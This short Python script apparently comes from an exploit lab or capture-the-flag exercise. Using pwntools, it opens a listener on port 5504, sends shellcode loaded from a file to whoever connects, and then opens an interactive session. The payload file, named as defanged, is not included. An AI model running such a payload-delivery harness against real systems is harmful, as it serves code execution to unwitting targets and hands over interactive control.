#!/usr/bin/env python
from pwn import listen

with open('sorry_defanged_exploit.bin', 'rb') as f:
    shellcode = f.read()

l = listen(5504, '0.0.0.0')
c = l.wait_for_connection()
print("[+] Got connection. Sending payload.")
l.sendline(shellcode)
l.interactive()
